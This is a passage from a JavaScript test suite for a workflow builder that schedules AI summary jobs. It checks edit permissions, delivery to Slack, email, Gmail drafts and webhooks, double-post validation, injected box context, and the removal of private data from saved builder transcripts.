    workspace_members: [{ workspace_id: 'ws', user_id: 'owner', role: 'member' }, { workspace_id: 'ws', user_id: 'editor', role: 'member' }, { workspace_id: 'ws', user_id: 'editor2', role: 'member' }, { workspace_id: 'ws', user_id: 'wsadmin', role: 'admin' }],
  });
  // An editor's job, changed by another editor: refused, nothing changes.
  let sb = seed();
  const mine = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor' });
  const { routine } = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', sessionId: mine.id, proposal: dailyReport(), ...lookups });
  assert.equal(routine.user_id, 'editor');
  const other = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor2', jobId: routine.id });
  const weekly = dailyReport(); weekly.trigger.config = { frequency: 'weekly', at: '09:30' };
  await assert.rejects(approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor2', sessionId: other.id, proposal: weekly, ...lookups }), e => e.status === 403);
  assert.equal(sb.tables.agent_routines[0].frequency, 'daily');
  assert.equal(sb.tables.agent_routines[0].user_id, 'editor');
  assert.equal(sb.tables.revbox_builder_sessions[1].state, 'open');
  // The same editor changing their own job keeps it theirs.
  const own = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', jobId: routine.id });
  assert.equal((await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', sessionId: own.id, proposal: weekly, ...lookups })).routine.user_id, 'editor');
  // The box owner may, and the job then runs as the owner.
  const byOwner = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  const r2 = (await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: byOwner.id, proposal: dailyReport(), ...lookups })).routine;
  assert.equal(r2.user_id, 'owner');
  assert.equal(r2.edited_by, 'owner');
  // A workspace admin who edits the box may too.
  const byAdmin = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'wsadmin', jobId: routine.id });
  assert.equal((await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'wsadmin', sessionId: byAdmin.id, proposal: dailyReport(), ...lookups })).routine.user_id, 'wsadmin');
});

test('approve stores the derived facts on the session proposal', async () => {
  const sb = database();
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s.id, proposal: dailyReport(), ...lookups, ...people });
  assert.equal(sb.tables.revbox_builder_sessions[0].proposal.facts.find(f => f.step_id === 'post').target, '#product-usage-cs-handoff (C0TU)');
});

test('builderRoutineColumns gives the box-delivery step an id no proposed step uses', () => {
  const p = dailyReport(); p.steps[2].id = 'box_delivery'; p.display[2].step_id = 'box_delivery';
  const checked = validateBuilderProposal(p, lookups);
  const cols = builderRoutineColumns(p, checked);
  assert.deepEqual(cols.steps.map(s => s.id), ['read', 'summary', 'box_delivery', 'box_delivery_2']);
});

test('the Slack layout the agent chose for box delivery lands on the revbox_delivery step (GET-872)', () => {
  const p = { ...dailyReport(), uses_box_delivery: true, box_delivery_format: 'report' };
  const checked = validateBuilderProposal(p, lookups);
  assert.ok(checked.ok !== false, JSON.stringify(checked.errors ?? []));
  assert.deepEqual(builderRoutineColumns(p, checked).steps.at(-1).config, { format: 'report' });
  assert.deepEqual(builderRoutineColumns({ ...p, box_delivery_format: undefined }, checked).steps.at(-1).config, {});
  const bad = validateBuilderProposal({ ...p, box_delivery_format: 'approval' }, lookups);
  assert.ok((bad.errors ?? []).some(e => /box_delivery_format/.test(e)));
});

// ── Run time ──────────────────────────────────────────────────────────────────

const doc = { id: 'd1', title: 'Product Usage daily', headline: null, sections: [{ label: 'Summary', body: 'Dealer A pulled 12 (+3).' }] };
const routine = (extra = {}) => ({ id: 'r1', name: 'TU daily', user_id: 'owner', revbox_id: 'box', steps: [
  { id: 'summary', type: 'agent', config: { mode: 'write', prompt: 'x' } },
  { id: 'box_delivery', type: 'revbox_delivery', config: {} },
], ...extra });

test('revbox_delivery posts the latest AI output to every destination the box has now', async () => {
  const sb = database();
  sb.tables.revboxes[0].delivery = [{ id: 'd-s', kind: 'slack', target: '#product-usage-cs-handoff' }, { id: 'd-w', kind: 'webhook', target: 'https://hooks.example/tu' }];
  const slack = []; const hooks = [];
  registerStepHandler('slack', async (a) => { slack.push(a); return { ok: true }; });
  registerStepHandler('safe_fetch', async (url, init) => { hooks.push({ url, init }); return { ok: true, status: 200 }; });
  const r = await runSteps(routine(), doc, { stage: 'scheduled', ctx: { supabase: sb, workspaceId: 'ws', runId: 'run-1' } });
  assert.equal(r.failed, undefined);
  assert.equal(r.delivered, 'revbox_delivery:2/2');
  assert.equal(slack[0].channel, '#product-usage-cs-handoff');
  assert.match(slack[0].text, /Dealer A pulled 12/);
  assert.equal(hooks[0].url, 'https://hooks.example/tu');
  assert.equal(hooks[0].init.headers['Idempotency-Key'], 'run-1:d-w');
  assert.equal(JSON.parse(hooks[0].init.body).revbox_id, 'box');
  const line = r.log.find(l => l.type === 'revbox_delivery');
  assert.equal(line.status, 'ok');
  assert.deepEqual(line.deliveries.map(d => [d.id, d.ok]), [['d-s', true], ['d-w', true]]);
});

test('a failed destination is recorded per destination and fails the step; the others still go', async () => {
  const sb = database();
  sb.tables.revboxes[0].delivery = [{ id: 'd-s', kind: 'slack', target: 'C0TU' }, { id: 'd-w', kind: 'webhook', target: 'https://hooks.example/down' }];
  let posted = 0;
  registerStepHandler('slack', async () => { posted++; return { ok: true }; });
  registerStepHandler('safe_fetch', async () => ({ ok: false, status: 503 }));
  const r = await runSteps(routine(), doc, { stage: 'scheduled', ctx: { supabase: sb, workspaceId: 'ws', runId: 'run-2' } });
  assert.equal(posted, 1);
  assert.equal(r.failed, true);
  assert.match(r.message, /webhook https:\/\/hooks\.example\/down: webhook 503/);
  const line = r.log.find(l => l.type === 'revbox_delivery');
  assert.equal(line.status, 'failed');
  assert.deepEqual(line.deliveries.map(d => [d.id, d.ok]), [['d-s', true], ['d-w', false]]);
});

test('an owner who lost the box stops the run before anything is sent', async () => {
  const sb = database();
  sb.tables.revboxes[0].shared = false;
  sb.tables.revboxes[0].delivery = [{ id: 'd-s', kind: 'slack', target: 'C0TU' }];
  let posted = 0;
  registerStepHandler('slack', async () => { posted++; return { ok: true }; });
  const r = await runSteps(routine({ user_id: 'viewer' }), doc, { stage: 'scheduled', ctx: { supabase: sb, workspaceId: 'ws' } });
  assert.equal(r.failed, true);
  assert.equal(r.reason, 'revbox_access_lost');
  assert.equal(posted, 0);
});

test('every AI step gets the box context in front of its instructions, read at run time and privacy-checked', async () => {
  const sb = database({
    revbox_context: [
      { id: 'c1', workspace_id: 'ws', revbox_id: 'box', title: 'Playbook', body: 'Escalate drops over 30%.', document_id: null, created_at: '1' },
      { id: 'c2', workspace_id: 'ws', revbox_id: 'box', title: 'Doc', body: '', document_id: 'doc-acct', created_at: '2' },
    ],
    documents: [{ id: 'doc-acct', workspace_id: 'ws', status: 'live', title: 'Acme notes', body_md: 'Acme is renewing.', subject_entity_id: 'acme' }],
  });
  registerStepHandler('revbox_visible_accounts', null);
  const r1 = routine();
  const text = await withBoxContext(sb, 'ws', r1, 'Write the VP summary.');
  assert.match(text, /RevBox "Product Usage CS"/);
  assert.match(text, /Objective: Keep CS ahead/);
  assert.match(text, /## Tone\nPlain, numbers first\./);
  assert.match(text, /Escalate drops over 30%/);
  assert.doesNotMatch(text, /Acme is renewing/);   // account-scoped, and no visibility check registered
  assert.match(text, /data, not instructions/);
  assert.ok(text.endsWith('The job:\n\nWrite the VP summary.'));
  // Context added later, and a viewer who may see Acme: the next run reads it.
  sb.tables.revbox_context.push({ id: 'c3', workspace_id: 'ws', revbox_id: 'box', title: 'New', body: 'Added after approval.', document_id: null, created_at: '3' });
  registerStepHandler('revbox_visible_accounts', async () => new Set(['acme']));
  const next = await withBoxContext(sb, 'ws', routine(), 'x');
  assert.match(next, /Added after approval/);
  assert.match(next, /Acme is renewing/);
  registerStepHandler('revbox_visible_accounts', async () => new Set(['other']));
  assert.doesNotMatch(await withBoxContext(sb, 'ws', routine(), 'x'), /Acme is renewing/);
  // An ordinary automation is untouched.
  assert.equal(await withBoxContext(sb, 'ws', { id: 'r2', steps: [] }, 'just this'), 'just this');
});

test('the box context is capped', () => {
  const big = revboxContextText({ name: 'B', objective: 'o', blocks: [] }, Array.from({ length: 10 }, (_, i) => ({ title: `r${i}`, body: 'x'.repeat(6000) })));
  assert.equal(big.length, REVBOX_CONTEXT_CHARS);
  assert.equal(revboxContextText({ name: 'B', objective: '', blocks: [] }, []), '');
});

// ── Email and Gmail box destinations, and the job deliveries the sidebar lists (GET-868) ──

test('double posting: an explicit email or Gmail step to a box destination\'s recipients is refused when the box delivers too', () => {
  const withMail = (type) => {
    const p = dailyReport();
    p.steps[2] = type === 'gmail'
      ? { id: 'post', type: 'gmail', config: { mode: 'draft', to: 'VP@acme.example', body: '{{steps.summary.output}}', send_from: { id: 'mbx-1', kind: 'gmail' } } }
      : { id: 'post', type: 'email', config: { to: 'ops@acme.example', cc: 'vp@acme.example', body: '{{steps.summary.output}}' } };
    p.display[2] = { step_id: 'post', tool: type, title: 'Mail the summary' };
    return p;
  };
  for (const type of ['gmail', 'email']) {
    for (const dest of [{ id: 'd1', kind: 'email', target: 'vp@acme.example, cfo@acme.example' }, { id: 'd2', kind: 'gmail', target: 'mbx-1', to: 'vp@acme.example' }]) {
      const r = validateBuilderProposal(withMail(type), { ...lookups, boxDestinations: [dest] });
      assert.equal(r.ok, false, `${type} step vs ${dest.kind} destination`);
      assert.match(r.errors.join(' '), /"post".*vp@acme\.example.*already.*box.*(drop|remove).*uses_box_delivery/i);
    }
    // Fine without box delivery, or to other people.
    assert.equal(validateBuilderProposal({ ...withMail(type), uses_box_delivery: false }, { ...lookups, boxDestinations: [{ kind: 'email', target: 'vp@acme.example' }] }).ok, true);
    assert.equal(validateBuilderProposal(withMail(type), { ...lookups, boxDestinations: [{ kind: 'email', target: 'someone@else.example' }, { kind: 'gmail', target: 'mbx-1', to: '' }] }).ok, true);
  }
});

test('revbox_delivery emails the output from OpenNous to every recipient: first To, the rest Cc', async () => {
  const sb = database();
  sb.tables.revboxes[0].delivery = [{ id: 'd-e', kind: 'email', target: 'vp@acme.example, cfo@acme.example' }];
  const sent = [];
  const realFetch = globalThis.fetch; const realKey = process.env.RESEND_API_KEY;
  process.env.RESEND_API_KEY = 'test-key';
  globalThis.fetch = async (url, init) => { sent.push({ url: String(url), body: JSON.parse(init.body) }); return new Response(JSON.stringify({ id: 'em-1' }), { status: 200 }); };
  try {
    const r = await runSteps(routine(), doc, { stage: 'scheduled', ctx: { supabase: sb, workspaceId: 'ws', runId: 'run-e' } });
    assert.equal(r.failed, undefined);
    assert.equal(r.delivered, 'revbox_delivery:1/1');
    assert.equal(sent.length, 1);
    assert.match(sent[0].url, /resend/);
    assert.deepEqual(sent[0].body.to, ['vp@acme.example']);
    assert.deepEqual(sent[0].body.cc, ['cfo@acme.example']);
    assert.equal(sent[0].body.subject, 'Product Usage daily');
    assert.match(sent[0].body.text, /Dealer A pulled 12/);
    assert.deepEqual(r.log.find(l => l.type === 'revbox_delivery').deliveries.map(d => [d.id, d.kind, d.ok]), [['d-e', 'email', true]]);
  } finally { globalThis.fetch = realFetch; if (realKey === undefined) delete process.env.RESEND_API_KEY; else process.env.RESEND_API_KEY = realKey; }
});

test('revbox_delivery to Gmail only ever creates a draft in the chosen mailbox, never sends', async () => {
  const sb = database();
  sb.tables.revboxes[0].delivery = [{ id: 'd-g', kind: 'gmail', target: 'mbx-1', to: 'vp@acme.example, cfo@acme.example' }, { id: 'd-half', kind: 'gmail', target: 'mbx-1', to: '' }];
  const drafts = []; let sends = 0;
  registerStepHandler('gmail_draft', async (a) => { drafts.push(a); return { status: 'created', id: 'draft-1', mailbox: 'cs@acme.example' }; });
  registerStepHandler('gmail_send', async () => { sends++; return { status: 'sent' }; });
  const r = await runSteps(routine(), doc, { stage: 'scheduled', ctx: { supabase: sb, workspaceId: 'ws', runId: 'run-g' } });
  assert.equal(r.failed, undefined);
  assert.equal(r.delivered, 'revbox_delivery:1/1');   // the one with no recipients yet is not a destination
  assert.equal(sends, 0);
  assert.equal(drafts.length, 1);
  assert.equal(drafts[0].connectionId, 'mbx-1');
  assert.equal(drafts[0].userId, 'owner');   // as the job's owner
  assert.equal(drafts[0].to, 'vp@acme.example, cfo@acme.example');
  assert.equal(drafts[0].subject, 'Product Usage daily');
  assert.match(drafts[0].body, /Dealer A pulled 12/);
  // A mailbox that is gone fails that destination, and still nothing is sent.
  registerStepHandler('gmail_draft', async () => ({ status: 'no_gmail' }));
  const gone = await runSteps(routine(), doc, { stage: 'scheduled', ctx: { supabase: sb, workspaceId: 'ws', runId: 'run-g2' } });
  assert.equal(gone.failed, true);
  assert.match(gone.message, /gmail mbx-1: gmail not connected/);
  assert.equal(gone.log.find(l => l.type === 'revbox_delivery').deliveries[0].error, 'gmail_not_connected');
  assert.equal(sends, 0);
});

test('revbox_delivery with an explicit Cc (GET-868): every To on To, the Cc on Cc; a Gmail draft gets its cc; a picked Slack channel posts by id', async () => {
  const sb = database();
  sb.tables.revboxes[0].delivery = [
    { id: 'd-e', kind: 'email', target: 'vp@acme.example, cto@acme.example', to: 'vp@acme.example, cto@acme.example', cc: 'cfo@acme.example' },
    { id: 'd-g', kind: 'gmail', target: 'mbx-1', to: 'vp@acme.example', cc: 'cfo@acme.example, ops@acme.example' },
    { id: 'd-s', kind: 'slack', target: 'C0CSHANDOFF', channel: 'cs-handoffs' },
  ];
  const sent = []; const drafts = []; const posts = []; let sends = 0;
  const realFetch = globalThis.fetch; const realKey = process.env.RESEND_API_KEY;
  process.env.RESEND_API_KEY = 'test-key';
  globalThis.fetch = async (url, init) => { sent.push({ url: String(url), body: JSON.parse(init.body) }); return new Response(JSON.stringify({ id: 'em-2' }), { status: 200 }); };
  registerStepHandler('gmail_draft', async (a) => { drafts.push(a); return { status: 'created', id: 'draft-2' }; });
  registerStepHandler('gmail_send', async () => { sends++; return { status: 'sent' }; });
  registerStepHandler('slack', async (a) => { posts.push(a); return { ok: true }; });
  try {
    const r = await runSteps(routine(), doc, { stage: 'scheduled', ctx: { supabase: sb, workspaceId: 'ws', runId: 'run-cc' } });
    assert.equal(r.failed, undefined);
    assert.equal(r.delivered, 'revbox_delivery:3/3');
    assert.deepEqual(sent[0].body.to, ['vp@acme.example', 'cto@acme.example']);
    assert.deepEqual(sent[0].body.cc, ['cfo@acme.example']);
    assert.deepEqual([drafts[0].to, drafts[0].cc, drafts[0].connectionId], ['vp@acme.example', 'cfo@acme.example, ops@acme.example', 'mbx-1']);
    assert.equal(sends, 0);
    assert.deepEqual([posts[0].channelId, posts[0].channel], ['C0CSHANDOFF', 'cs-handoffs']);
  } finally { globalThis.fetch = realFetch; if (realKey === undefined) delete process.env.RESEND_API_KEY; else process.env.RESEND_API_KEY = realKey; }
});

test('double posting counts a box email destination\'s Cc and a picked Slack channel\'s id and name', () => {
  const p = dailyReport();
  assert.equal(validateBuilderProposal(p, { ...lookups, ...people, boxDestinations: [{ kind: 'slack', target: 'C0OTHER', channel: 'product-usage-cs-handoff' }] }).ok, false);
  const g = dailyReport(); g.uses_box_delivery = true; g.steps.splice(2, 1); g.display.splice(2, 1);
  g.steps.push({ id: 'mail', type: 'email', config: { to: 'cfo@acme.example', body: '{{steps.summary.output}}' } }); g.display.push({ step_id: 'mail', tool: 'email', title: 'Email' });
  assert.match(validateBuilderProposal(g, { ...lookups, boxDestinations: [{ kind: 'email', target: 'vp@acme.example', to: 'vp@acme.example', cc: 'cfo@acme.example' }] }).errors.join(' '), /cfo@acme\.example.*twice/);
});

// The Product Usage job plus a CS handoff job that drafts in Gmail, emails and calls a webhook.
const boxJobs = () => [
  { id: 'r1', name: 'Product Usage daily', steps: dailyReport().steps.concat({ id: 'box_delivery', type: 'revbox_delivery', config: {} }) },
  { id: 'r2', name: 'CS handoff', steps: [
    { id: 'w', type: 'agent', config: { prompt: 'x' } },
    { id: 'g', type: 'gmail', config: { mode: 'draft', to: 'dana@acme.example', body: 'x', send_from: { id: 'mbx-1', kind: 'gmail' } } },
    { id: 'e', type: 'email', config: { to: 'cs@acme.example', cc: 'vp@acme.example', body: 'x' } },
    { id: 'h', type: 'webhook', config: { url: 'https://hooks.partner.example/in?token=secret' } },
    { id: 'dm', type: 'slack', config: { action: 'dm', user_id: 'U1', user_name: 'Dana Vp', text: 'x' } },
    { id: 'u', type: 'hubspot', config: { action: 'note', body: 'x' } },
  ] },
];

test('job deliveries are derived from the jobs\' real steps, labelled with the job', () => {
  const out = revboxJobDeliveries(boxJobs(), { mailboxes: [{ id: 'mbx-1', email: 'cs-team@acme.example' }] });
  assert.deepEqual(out.map(d => [d.job_name, d.kind, d.label]), [
    ['Product Usage daily', 'slack', '#product-usage-cs-handoff'],
    ['CS handoff', 'gmail', 'Gmail draft · from cs-team@acme.example · to dana@acme.example'],
    ['CS handoff', 'email', 'Email · to cs@acme.example, vp@acme.example'],
    ['CS handoff', 'webhook', 'hooks.partner.example'],
    ['CS handoff', 'slack', 'DM to Dana Vp'],
  ]);
  assert.equal(out[0].job_id, 'r1');
  assert.equal(out[0].target, 'C0TU');
  assert.equal(out[1].target, 'mbx-1');
  // The webhook's path and query (often a token) are never shown.
  assert.ok(out.every(d => !JSON.stringify(d).includes('secret')));
  // An unknown mailbox reads without a From, not with a guess.
  assert.equal(revboxJobDeliveries(boxJobs())[1].label, 'Gmail draft · to dana@acme.example');
});

test('job deliveries are read with the box\'s own access: members see them, nobody else does', async () => {
  const sb = database({
    revbox_members: [{ workspace_id: 'ws', revbox_id: 'box', user_id: 'viewer', role: 'viewer' }],
    workspace_members: [{ workspace_id: 'ws', user_id: 'owner', role: 'admin' }, { workspace_id: 'ws', user_id: 'viewer', role: 'member' }, { workspace_id: 'ws', user_id: 'outsider', role: 'member' }],
    agent_routines: boxJobs().map(r => ({ ...r, workspace_id: 'ws', revbox_id: 'box' })),
  });
  sb.tables.revboxes[0].shared = false;
  let looked = 0;
  const mailboxes = async () => { looked++; return [{ id: 'mbx-1', email: 'cs-team@acme.example' }]; };
  const seen = await listRevboxJobDeliveries(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'viewer', mailboxes });
  assert.equal(seen.routines.length, 2);
  assert.ok(seen.job_deliveries.some(d => d.label === 'Gmail draft · from cs-team@acme.example · to dana@acme.example'));
  await assert.rejects(listRevboxJobDeliveries(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'outsider', mailboxes }), e => [403, 404].includes(e.status));
  assert.equal(looked, 1);   // the outsider is refused before anything is read
});

// ── Pre-ship review (GET-858) ─────────────────────────────────────────────────

/** Every tool_result body in a transcript, as text. */
const resultBodies = (messages) => messages.flatMap(m => (Array.isArray(m.content) ? m.content : []).filter(b => b?.type === 'tool_result').map(b => (typeof b.content === 'string' ? b.content : JSON.stringify(b.content))));
/** Every tool_use has its tool_result in the next message, and nothing else answers. */
function assertValidTranscript(messages) {
  assert.equal(messages[0].role, 'user');
  messages.forEach((m, i) => {
    if (i) assert.notEqual(m.role, messages[i - 1].role, `roles alternate at ${i}`);
    if (m.role !== 'assistant' || !Array.isArray(m.content)) return;
    const uses = m.content.filter(b => b.type === 'tool_use').map(b => b.id);
    if (!uses.length) return;
    const next = messages[i + 1];
    assert.ok(next, `tool_use at ${i} is answered`);
    assert.deepEqual(next.content.filter(b => b.type === 'tool_result').map(b => b.tool_use_id).sort(), [...uses].sort());
  });
}
/** A transcript whose tool results carry the creator's private data. */
function privateTranscript() {
  const t = transcript();
  t[2] = { role: 'user', content: [{ type: 'tool_result', tool_use_id: 't1', content: [{ type: 'text', text: 'SECRET-HUBSPOT-ROW Acme ARR 1.2M' }] }] };
  t.splice(3, 0, { role: 'assistant', content: [{ type: 'text', text: 'Creator-only remark.' }, { type: 'tool_use', id: 's1', name: 'search_accounts', input: { q: 'acme' } }] },
    { role: 'user', content: [{ type: 'tool_result', tool_use_id: 's1', content: 'SECRET-REFERENCE-DOC body' }, { type: 'text', text: 'and keep it short' }] });
  return t;
}
const LEAKS = ['SECRET-HUBSPOT-ROW', 'SECRET-REFERENCE-DOC', '{"objects":[]}', '-> 08:00', 'did not validate', 'secret'];

test('review 1: Edit by the same person keeps their words, never a tool result body or thinking', async () => {
  const sb = database();
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  await saveBuilderSession(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'owner', messages: privateTranscript(), proposal: dailyReport() });
  const { routine } = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s.id, ...lookups });
  const opened = await openBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  const msgs = sb.tables.revbox_builder_sessions.find(r => r.id === opened.session.id).messages;
  assertValidTranscript(msgs);
  const raw = JSON.stringify(msgs);
  // Their own answers to an ask are their words and stay (GET-889); no tool result body does.
  for (const leak of LEAKS.filter(l => l !== '-> 08:00')) assert.ok(!raw.includes(leak), `transcript leaks ${leak}`);
  assert.ok(raw.includes('-> 08:00'));
  assert.ok(!msgs.some(m => Array.isArray(m.content) && m.content.some(b => b.type === 'thinking' || b.type === 'redacted_thinking')));
  assert.ok(resultBodies(msgs).every(b => b === RESULT_NOT_CARRIED || b === APPROVED_NOTE || b.startsWith('The user answered:')), resultBodies(msgs).join(' | '));
  assert.ok(raw.includes('Creator-only remark.') && raw.includes('and keep it short') && raw.includes('Product Usage report every morning'));
  // The history shows their own chat.
  assert.ok(opened.history.some(i => i.role === 'assistant' && i.text.includes('Creator-only remark.')));
  assert.equal(opened.history.at(-1).kind, 'proposal');
  assert.ok(!JSON.stringify(opened.history).includes('SECRET'));
  // latestBuilderSessionForJob hands out the same sanitized transcript.
  const latest = await latestBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  for (const leak of LEAKS.filter(l => l !== '-> 08:00')) assert.ok(!JSON.stringify(latest.messages).includes(leak), `latest leaks ${leak}`);
});

const withEditor = () => database({ revbox_members: [{ workspace_id: 'ws', revbox_id: 'box', user_id: 'editor', role: 'editor' }],
  workspace_members: [{ workspace_id: 'ws', user_id: 'owner', role: 'admin' }, { workspace_id: 'ws', user_id: 'editor', role: 'member' }] });

test('review 1: Edit by another editor gets the approved proposal only', async () => {
  const sb = withEditor();
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  await saveBuilderSession(sb, { workspaceId: 'ws', sessionId: s.id, userId: 'owner', messages: privateTranscript(), proposal: dailyReport() });
  const { routine } = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s.id, name: 'Morning report', ...lookups });
  const opened = await openBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', jobId: routine.id });
  const msgs = sb.tables.revbox_builder_sessions.find(r => r.id === opened.session.id).messages;
  assertValidTranscript(msgs);
  const raw = JSON.stringify(msgs);
  for (const leak of [...LEAKS, 'Creator-only remark.', 'and keep it short', 'Product Usage report every morning', 'Let me look']) assert.ok(!raw.includes(leak), `transcript leaks ${leak}`);
  const use = msgs.flatMap(m => (Array.isArray(m.content) ? m.content : [])).find(b => b.type === 'tool_use' && b.name === 'propose_job');
  assert.equal(use.input.name, 'Morning report');
  assert.deepEqual(resultBodies(msgs), [APPROVED_NOTE]);
  // The history: a note and the approved card, nothing of the creator's chat.
  assert.deepEqual(opened.history.map(i => i.kind ?? i.role), ['assistant', 'proposal']);
  assert.equal(opened.history[0].text, "Edited from Morning report's approved setup.");
  assert.deepEqual([opened.history[1].approved, opened.history[1].proposal.name], [true, 'Morning report']);
  // latestBuilderSessionForJob: another editor's transcript is the proposal only, too.
  const latest = await latestBuilderSessionForJob(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'editor', jobId: routine.id });
  for (const leak of [...LEAKS, 'Creator-only remark.']) assert.ok(!JSON.stringify(latest.messages).includes(leak), `latest leaks ${leak}`);
});

test('review 1: sanitizeBuilderTranscript keeps the format valid when results were missing or mixed', () => {
  const t = privateTranscript();
  const same = sanitizeBuilderTranscript(t, { keepText: true });
  assertValidTranscript(seedTranscriptFromApproved(same, dailyReport()));
  const other = sanitizeBuilderTranscript(t, { keepText: false, approved: dailyReport() });
  assertValidTranscript(seedTranscriptFromApproved(other, dailyReport()));
  assert.ok(!JSON.stringify(other).includes('Let me look'));
});

test('review 6: approving an Edit keeps the job paused or on as it was; a new job defaults to on', async () => {
  const sb = database();
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  const seen = [];
  const enableCheck = async (a) => { seen.push(a); return null; };
  const { routine, enabled } = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s.id, proposal: dailyReport(), enableCheck, ...lookups });
  assert.equal(enabled, true);
  // Paused: an Edit keeps it paused, with no clock slot, and runs no switch-on check.
  sb.tables.agent_routines[0].enabled = false; sb.tables.agent_routines[0].next_run_at = null;
  const e1 = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  const paused = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: e1.id, proposal: dailyReport(), enableCheck, ...lookups });
  assert.deepEqual([paused.enabled, paused.routine.enabled, paused.routine.next_run_at, paused.reason], [false, false, null, undefined]);
  assert.equal(seen.length, 1);
  // On: stays on, re-checked as an existing job.
  sb.tables.agent_routines[0].enabled = true;
  const e2 = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  const on = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: e2.id, proposal: dailyReport(), enableCheck, ...lookups });
  assert.deepEqual([on.enabled, on.routine.enabled], [true, true]);
  assert.deepEqual([seen[1].isNew, seen[1].routineId], [false, routine.id]);
  // On, but the check now fails: saved off with the reason.
  const e3 = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: routine.id });
  const off = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: e3.id, proposal: dailyReport(), enableCheck: async () => 'Over the plan limit.', ...lookups });
  assert.deepEqual([off.enabled, off.reason], [false, 'Over the plan limit.']);
});

test('review 8: a box Gmail destination in someone else\'s mailbox warns when the approver will own the job', async () => {
  const sb = withEditor();
  sb.tables.revboxes[0].delivery = [{ id: 'd1', kind: 'gmail', target: 'conn-dana', to: 'vp@x.example' }, { id: 'd2', kind: 'gmail', target: 'conn-owner', to: 'cs@x.example' }];
  const mailboxOwners = [{ id: 'conn-dana', email: 'dana@acme.example', user_id: 'dana', user_name: 'Dana' }, { id: 'conn-owner', email: 'owner@acme.example', user_id: 'owner', user_name: 'Olly' }];
  const s = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  const out = await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s.id, proposal: dailyReport(), mailboxOwners, ...lookups });
  assert.equal(out.routine.user_id, 'owner');
  assert.deepEqual(out.warnings, [{ kind: 'mailbox_owner', destination_id: 'd1', mailbox: 'dana@acme.example', owner: 'Dana', message: "Drafts go to Dana's mailbox (dana@acme.example) and are written with your access.", fix: { label: "Pick a mailbox of yours for that destination if Dana shouldn't get them." } }]);
  // The session's proposal carries it, so the card shows it.
  const saved = sb.tables.revbox_builder_sessions[0].proposal;
  assert.deepEqual(saved.warnings.filter(w => w.kind === 'mailbox_owner').map(w => [w.destination_id, w.message]), [['d1', out.warnings[0].message]]);
  assert.equal(saved.warnings.filter(w => w.kind === 'unverified').length, 1);
  // A proposal that carries the warning still validates (Edit re-proposes it), and re-approving does not stack it.
  assert.equal(validateBuilderProposal(saved, lookups).ok, true);
  const e = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', jobId: out.routine.id });
  await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: e.id, proposal: saved, mailboxOwners, ...lookups });
  assert.equal(sb.tables.revbox_builder_sessions.find(r => r.id === e.id).proposal.warnings.filter(w => w.kind === 'mailbox_owner').length, 1);
  // Without a box-delivery step there is nothing to warn about.
  const s2 = await createBuilderSession(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner' });
  const noBox = { ...dailyReport(), uses_box_delivery: false };
  assert.equal((await approveBuilderProposal(sb, { workspaceId: 'ws', revboxId: 'box', userId: 'owner', sessionId: s2.id, proposal: noBox, mailboxOwners, ...lookups })).warnings, undefined);
});

test('review 8: the Delivery rail gets a warning row for a box Gmail destination a job cannot draft in', async () => {
  const sb = database({ users: [{ id: 'dana', name: 'Dana' }],
    agent_routines: [
      { id: 'r1', workspace_id: 'ws', revbox_id: 'box', user_id: 'owner', name: 'Daily', steps: [{ id: 'box_delivery', type: 'revbox_delivery', config: {} }] },
      { id: 'r2', workspace_id: 'ws', revbox_id: 'box', user_id: 'dana', name: 'Dana job', steps: [{ id: 'box_delivery', type: 'revbox_delivery', config: {} }] },
      { id: 'r3', workspace_id: 'ws', revbox_id: 'box', user_id: 'owner', name: 'No box', steps: [{ id: 's', type: 'slack', config: { channel_id: 'C1', channel: 'x' } }] },
    ] });
